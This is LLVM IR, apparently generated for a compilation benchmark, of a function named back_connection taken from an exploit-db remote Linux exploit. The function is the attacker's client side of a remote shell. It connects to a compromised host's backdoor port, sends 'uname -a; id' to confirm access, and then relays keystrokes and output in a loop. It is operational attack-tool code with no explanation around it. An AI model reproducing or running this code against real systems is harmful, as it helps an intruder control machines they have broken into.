; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_143.c_back_connection.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_143.c_back_connection.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i64 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [30 x i8] c"/bin/uname -a ; /usr/bin/id;\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [8 x i8] c"[-] %s\0A\00", align 1
@errno = common dso_local global i32 0, align 4
@D_BACK = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [20 x i8] c"[+] Let's rock on!\0A\00", align 1
@.str.3 = private unnamed_addr constant [49 x i8] c"[-] Connection closed by remote host,exiting...\0A\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"%s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @back_connection(i64 %0) #0 {
  %2 = alloca i64, align 8
  %3 = alloca %struct.sockaddr_in, align 8
  %4 = alloca [4096 x i8], align 16
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  store i64 %0, i64* %2, align 8
  store i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str, i64 0, i64 0), i8** %8, align 8
  %9 = load i32, i32* @AF_INET, align 4
  %10 = load i32, i32* @SOCK_STREAM, align 4
  %11 = call i32 @socket(i32 %9, i32 %10, i32 0)
  store i32 %11, i32* %6, align 4
  %12 = load i32, i32* %6, align 4
  %13 = icmp slt i32 %12, 0
  br i1 %13, label %14, label %20

14:                                               ; preds = %1
  %15 = load i32, i32* @stderr, align 4
  %16 = load i32, i32* @errno, align 4
  %17 = call i8* @strerror(i32 %16)
  %18 = call i32 (i32, i8*, ...) @fprintf(i32 %15, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i8* %17)
  %19 = call i32 @exit(i32 1) #3
  unreachable

20:                                               ; preds = %1
  %21 = load i32, i32* @AF_INET, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  store i32 %21, i32* %22, align 4
  %23 = load i32, i32* @D_BACK, align 4
  %24 = call i32 @htons(i32 %23)
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i32 %24, i32* %25, align 8
  %26 = load i64, i64* %2, align 8
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  %28 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %27, i32 0, i32 0
  store i64 %26, i64* %28, align 8
  %29 = load i32, i32* %6, align 4
  %30 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %31 = call i32 @connect(i32 %29, %struct.sockaddr* %30, i32 4)
  %32 = icmp eq i32 %31, -1
  br i1 %32, label %33, label %40

33:                                               ; preds = %20
  %34 = load i32, i32* @stderr, align 4
  %35 = load i32, i32* @errno, align 4
  %36 = call i8* @strerror(i32 %35)
  %37 = call i32 (i32, i8*, ...) @fprintf(i32 %34, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i8* %36)
  %38 = load i32, i32* %6, align 4
  %39 = call i32 @close(i32 %38)
  ret i32 0

40:                                               ; preds = %20
  %41 = load i32, i32* @stdout, align 4
  %42 = call i32 (i32, i8*, ...) @fprintf(i32 %41, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.2, i64 0, i64 0))
  %43 = load i32, i32* %6, align 4
  %44 = load i8*, i8** %8, align 8
  %45 = load i8*, i8** %8, align 8
  %46 = call i32 @strlen(i8* %45)
  %47 = call i32 @send(i32 %43, i8* %44, i32 %46, i32 0)
  store i32 %47, i32* %7, align 4
  %48 = load i32, i32* %7, align 4
  %49 = icmp slt i32 %48, 0
  br i1 %49, label %50, label %58

50:                                               ; preds = %40
  %51 = load i32, i32* @stderr, align 4
  %52 = load i32, i32* @errno, align 4
  %53 = call i8* @strerror(i32 %52)
  %54 = call i32 (i32, i8*, ...) @fprintf(i32 %51, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i8* %53)
  %55 = load i32, i32* %6, align 4
  %56 = call i32 @close(i32 %55)
  %57 = call i32 @exit(i32 1) #3
  unreachable

58:                                               ; preds = %40
  br label %59

59:                                               ; preds = %106, %58
  %60 = call i32 @FD_ZERO(i32* %5)
  %61 = call i32 @FD_SET(i32 0, i32* %5)
  %62 = load i32, i32* %6, align 4
  %63 = call i32 @FD_SET(i32 %62, i32* %5)
  %64 = call i32 @select(i32 255, i32* %5, i32* null, i32* null, i32* null)
  %65 = icmp eq i32 %64, -1
  br i1 %65, label %66, label %74

66:                                               ; preds = %59
  %67 = load i32, i32* @stderr, align 4
  %68 = load i32, i32* @errno, align 4
  %69 = call i8* @strerror(i32 %68)
  %70 = call i32 (i32, i8*, ...) @fprintf(i32 %67, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i8* %69)
  %71 = load i32, i32* %6, align 4
  %72 = call i32 @close(i32 %71)
  %73 = call i32 @exit(i32 1) #3
  unreachable

74:                                               ; preds = %59
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %76 = call i32 @memset(i8* %75, i32 0, i32 4096)
  %77 = load i32, i32* %6, align 4
  %78 = call i64 @FD_ISSET(i32 %77, i32* %5)
  %79 = icmp ne i64 %78, 0
  br i1 %79, label %80, label %95

80:                                               ; preds = %74
  %81 = load i32, i32* %6, align 4
  %82 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %83 = call i32 @recv(i32 %81, i8* %82, i32 4096, i32 0)
  %84 = icmp eq i32 %83, -1
  br i1 %84, label %85, label %91

85:                                               ; preds = %80
  %86 = load i32, i32* @stderr, align 4
  %87 = call i32 (i32, i8*, ...) @fprintf(i32 %86, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.3, i64 0, i64 0))
  %88 = load i32, i32* %6, align 4
  %89 = call i32 @close(i32 %88)
  %90 = call i32 @exit(i32 1) #3
  unreachable

91:                                               ; preds = %80
  %92 = load i32, i32* @stderr, align 4
  %93 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %94 = call i32 (i32, i8*, ...) @fprintf(i32 %92, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* %93)
  br label %95

95:                                               ; preds = %91, %74
  %96 = call i64 @FD_ISSET(i32 0, i32* %5)
  %97 = icmp ne i64 %96, 0
  br i1 %97, label %98, label %106

98:                                               ; preds = %95
  %99 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %100 = call i32 @read(i32 0, i8* %99, i32 4096)
  %101 = load i32, i32* %6, align 4
  %102 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %103 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %104 = call i32 @strlen(i8* %103)
  %105 = call i32 @write(i32 %101, i8* %102, i32 %104)
  br label %106

106:                                              ; preds = %98, %95
  br label %59
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i8* @strerror(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
